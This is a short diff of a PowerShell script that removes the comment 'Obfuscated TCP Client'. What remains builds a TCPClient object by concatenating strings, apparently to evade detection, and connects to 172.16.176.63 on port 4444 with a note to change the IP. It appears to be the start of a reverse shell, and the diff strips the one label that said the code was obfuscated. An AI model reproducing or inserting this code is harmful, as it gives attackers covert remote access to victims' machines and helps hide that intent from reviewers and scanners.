@@ -1,4 +1,3 @@
-# Obfuscated TCP Client
 $a = "System.Net.Sockets."
 $b = "TCPClient"
 $c = New-Object ($a + $b)("172.16.176.63", 4444) # Change IP if needed
